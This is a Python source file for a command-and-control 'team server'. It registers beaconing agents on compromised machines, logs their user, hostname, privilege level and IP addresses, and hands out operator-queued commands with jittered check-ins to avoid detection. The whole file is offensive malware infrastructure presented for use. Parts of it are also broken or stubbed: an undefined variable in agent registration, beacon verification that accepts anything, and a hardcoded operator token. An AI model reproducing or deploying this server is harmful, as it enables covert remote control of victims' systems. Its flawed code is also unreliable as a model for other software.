#!/usr/bin/env python3
"""
Distributed team server for professional C2
"""
import asyncio
import aiohttp
from aiohttp import web
import json
import time
import secrets
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
import hashlib
import base64

@dataclass
class Agent:
    """C2 Agent representation"""
    agent_id: str
    first_seen: float
    last_seen: float
    platform: str
    user: str
    hostname: str
    integrity_level: str
    external_ip: str
    internal_ip: str
    tasks: List[Dict]
    active: bool = True

@dataclass
class Task:
    """Task for agent execution"""
    task_id: str
    agent_id: str
    command: str
    arguments: Dict
    created: float
    completed: Optional[float] = None
    result: Optional[str] = None
    status: str = "pending"  # pending, running, completed, failed

class DistributedTeamServer:
    """
    Distributed team server for managing C2 infrastructure
    """
    
    def __init__(self, host='0.0.0.0', port=8443):
        self.host = host
        self.port = port
        self.agents: Dict[str, Agent] = {}
        self.tasks: Dict[str, Task] = {}
        self.operator_sessions: Dict[str, Dict] = {}
        self.app = web.Application()
        self.setup_routes()
    
    def setup_routes(self):
        """Setup HTTP routes for C2 communication"""
        self.app.router.add_post('/beacon/checkin', self.handle_beacon_checkin)
        self.app.router.add_post('/beacon/task_result', self.handle_task_result)
        self.app.router.add_get('/operator/agents', self.handle_get_agents)
        self.app.router.add_post('/operator/task', self.handle_create_task)
        self.app.router.add_get('/operator/tasks/{agent_id}', self.handle_get_tasks)
    
    async def handle_beacon_checkin(self, request):
        """Handle agent beacon checkin"""
        try:
            data = await request.json()
            
            # Verify and decrypt beacon data
            beacon_data = self.verify_beacon_data(data)
            if not beacon_data:
                return web.Response(status=401, text="Unauthorized")
            
            # Update or register agent
            agent_id = beacon_data['agent_id']
            if agent_id in self.agents:
                await self.update_agent(agent_id, beacon_data)
            else:
                await self.register_agent(agent_id, beacon_data)
            
            # Get pending tasks for agent
            pending_tasks = await self.get_pending_tasks(agent_id)
            
            response = {
                'status': 'success',
                'tasks': [asdict(task) for task in pending_tasks],
                'next_checkin': self.calculate_next_checkin()
            }
            
            return web.json_response(response)
            
        except Exception as e:
            print(f"Beacon checkin error: {e}")
            return web.Response(status=500, text="Internal Server Error")
    
    async def handle_task_result(self, request):
        """Handle task result from agent"""
        try:
            data = await request.json()
            
            task_id = data.get('task_id')
            result = data.get('result')
            status = data.get('status')
            
            if task_id in self.tasks:
                self.tasks[task_id].completed = time.time()
                self.tasks[task_id].result = result
                self.tasks[task_id].status = status
                
                print(f"Task {task_id} completed with status: {status}")
            
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            print(f"Task result error: {e}")
            return web.Response(status=500, text="Internal Server Error")
    
    async def handle_get_agents(self, request):
        """Handle operator request for agent list"""
        # Verify operator authentication
        auth_token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not self.verify_operator_token(auth_token):
            return web.Response(status=401, text="Unauthorized")
        
        agents_data = {
            agent_id: {
                'first_seen': agent.first_seen,
                'last_seen': agent.last_seen,
                'platform': agent.platform,
                'user': agent.user,
                'hostname': agent.hostname,
                'integrity_level': agent.integrity_level,
                'external_ip': agent.external_ip,
                'internal_ip': agent.internal_ip,
                'active': agent.active
            }
            for agent_id, agent in self.agents.items()
        }
        
        return web.json_response(agents_data)
    
    async def handle_create_task(self, request):
        """Handle operator task creation"""
        try:
            auth_token = request.headers.get('Authorization', '').replace('Bearer ', '')
            if not self.verify_operator_token(auth_token):
                return web.Response(status=401, text="Unauthorized")
            
            data = await request.json()
            agent_id = data.get('agent_id')
            command = data.get('command')
            arguments = data.get('arguments', {})
            
            if agent_id not in self.agents:
                return web.Response(status=404, text="Agent not found")
            
            task = await self.create_task(agent_id, command, arguments)
            
            return web.json_response({
                'task_id': task.task_id,
                'status': 'created'
            })
            
        except Exception as e:
            print(f"Task creation error: {e}")
            return web.Response(status=500, text="Internal Server Error")
    
    async def handle_get_tasks(self, request):
        """Get tasks for specific agent"""
        agent_id = request.match_info.get('agent_id')
        auth_token = request.headers.get('Authorization', '').replace('Bearer ', '')
        
        if not self.verify_operator_token(auth_token):
            return web.Response(status=401, text="Unauthorized")
        
        agent_tasks = [
            asdict(task) for task in self.tasks.values() 
            if task.agent_id == agent_id
        ]
        
        return web.json_response(agent_tasks)
    
    def verify_beacon_data(self, data: Dict) -> Optional[Dict]:
        """Verify and decrypt beacon data"""
        try:
            # Implement beacon verification logic
            # This would include decryption, signature verification, etc.
            return data  # Simplified for example
        except:
            return None
    
    async def register_agent(self, agent_id: str, beacon_data: Dict):
        """Register new agent"""
        system_info = beacon_data.get('system_info', {})
        
        agent = Agent(
            agent_id=agent_id,
            first_seen=time.time(),
            last_seen=time.time(),
            platform=beacon_data.get('platform', 'unknown'),
            user=system_info.get('hostname', 'unknown'),
            hostname=system_info.get('hostname', 'unknown'),
            integrity_level='medium',  # Would be determined from system info
            external_ip=request.remote,  # Would need request context
            internal_ip=system_info.get('internal_ip', 'unknown'),
            tasks=[]
        )
        
        self.agents[agent_id] = agent
        print(f"New agent registered: {agent_id} from {agent.external_ip}")
    
    async def update_agent(self, agent_id: str, beacon_data: Dict):
        """Update existing agent information"""
        if agent_id in self.agents:
            self.agents[agent_id].last_seen = time.time()
            # Update other fields as needed
    
    async def get_pending_tasks(self, agent_id: str) -> List[Task]:
        """Get pending tasks for agent"""
        return [
            task for task in self.tasks.values() 
            if task.agent_id == agent_id and task.status == 'pending'
        ]
    
    async def create_task(self, agent_id: str, command: str, arguments: Dict) -> Task:
        """Create new task for agent"""
        task_id = secrets.token_hex(16)
        task = Task(
            task_id=task_id,
            agent_id=agent_id,
            command=command,
            arguments=arguments,
            created=time.time()
        )
        
        self.tasks[task_id] = task
        return task
    
    def calculate_next_checkin(self) -> int:
        """Calculate next checkin time with jitter"""
        base_interval = 60  # 1 minute base
        jitter = secrets.randbelow(30)  # 0-30 seconds jitter
        return base_interval + jitter
    
    def verify_operator_token(self, token: str) -> bool:
        """Verify operator authentication token"""
        # Implement proper token verification
        return token == "demo_token"  # Simplified for example
    
    async def start(self):
        """Start the team server"""
        print(f"🚀 Starting distributed team server on {self.host}:{self.port}")
        
        runner = web.AppRunner(self.app)
        await runner.setup()
        
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()
        
        print(f"✅ Team server running on {self.host}:{self.port}")
        
        # Keep server running
        await asyncio.Future()

async def main():
    """Main entry point for team server"""
    server = DistributedTeamServer()
    await server.start()

if __name__ == "__main__":
    asyncio.run(main())